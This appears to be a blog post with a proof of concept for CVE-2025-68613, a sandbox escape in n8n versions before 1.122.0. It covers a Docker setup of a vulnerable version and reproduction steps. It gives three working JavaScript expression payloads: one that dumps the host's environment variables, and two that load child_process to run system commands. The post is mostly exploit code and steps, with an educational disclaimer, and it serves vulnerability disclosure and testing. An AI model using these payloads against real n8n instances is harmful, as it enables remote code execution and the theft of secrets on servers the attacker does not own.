---
layout: post
title: "PoC: n8n Sandbox Escape (CVE-2025-68613)"
date: 2025-12-26
---

> **Educational Purposes Only**
This Proof of Concept demonstrates a critical vulnerability (CVE-2025-68613) in n8n. Do not use this on systems you do not own or have explicit permission to test.

## Vulnerability Overview
n8n versions prior to 1.122.0 contain a Remote Code Execution (RCE) vulnerability. Authenticated users can bypass the expression sandbox and execute arbitrary code on the host system via specific JavaScript payloads in the workflow expression editor.

## 1. Setup Vulnerable Environment
Create a data volume and run a vulnerable version of n8n (e.g., v1.120.0).

```bash
# Create volume for persistence
docker volume create n8n_data

# Run vulnerable n8n instance
docker run -it --rm \
  --name n8n \
  -p 5678:5678 \
  -v n8n_data:/home/node/.n8n \
  n8nio/n8n:1.120.0
```

## 2. Reproduction Steps

### Access the Interface
Navigate to [http://localhost:5678](http://localhost:5678) and complete the initial setup if needed.

![]({{ site.baseurl }}/assets/images/n8n-cve/navigate.png)

### Create a Workflow
Click "Add Workflow" to start a blank workflow.

![]({{ site.baseurl }}/assets/images/n8n-cve/create_workflow.png)

### Add a Vulnerable Node
Add a **Set** node to the workflow. This node allows us to define values that can be evaluated as expressions.

![]({{ site.baseurl }}/assets/images/n8n-cve/add_set.png)

### Configure Expression
In the Set node, modify a parameter (e.g., `value`) and change the input type to **Expression**.

![]({{ site.baseurl }}/assets/images/n8n-cve/choose_expression.png)

## 3. Exploitation Payloads
Enter the following payloads into the expression editor to demonstrate the vulnerability.

### Payload 1: Environment Variable Dump
This payload accesses `this.process.env` to leak sensitive environment variables from the container.

**Payload:**
{% raw %}
```javascript
{{ (function() {
  return JSON.stringify(this.process.env, null, 2);
})() }}
```
{% endraw %}

**Result:**
![]({{ site.baseurl }}/assets/images/n8n-cve/payload_env.png)

### Payload 2: Remote Code Execution (whoami)
This payload bypasses the sandbox by accessing `process.mainModule.require` to load the `child_process` module, allowing execution of arbitrary system commands.

**Payload:**
{% raw %}
```javascript
{{ (function() {
  const require = this.process.mainModule.require;
  const { execSync } = require('child_process');
  return execSync('whoami').toString();
})() }}
```
{% endraw %}

![]({{ site.baseurl }}/assets/images/n8n-cve/payload_who_am_i.png)

**Result:**
Verifies the user context of the running process.

### Payload 3: Full RCE (List Root Directory)
Demonstrates the ability to browse the file system.

**Payload:**
{% raw %}
```javascript
{{ (function() {
  const require = this.process.mainModule.require;
  const { execSync } = require('child_process');
  return execSync('ls -la /').toString();
})() }}
```
{% endraw %}

**Result:**
![]({{ site.baseurl }}/assets/images/n8n-cve/payload_ls.png)
